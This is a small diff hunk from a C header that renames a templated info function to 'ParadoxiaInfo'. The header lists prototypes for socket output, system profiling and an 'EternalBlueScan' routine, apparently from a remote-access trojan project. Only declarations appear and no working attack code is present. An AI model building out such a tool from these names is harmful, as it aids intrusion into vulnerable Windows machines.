@@ -53,7 +53,7 @@ void ramsize(int mode);
 void SYSTEMINFO(int mode);
 //=====================
 void sockprintf(const char* words, ...);
-char* {{installdir}}Info();
+char* ParadoxiaInfo();
 BOOL isFile(const char* file);
 void UserPC();
 void EternalBlueScan(const char* host);
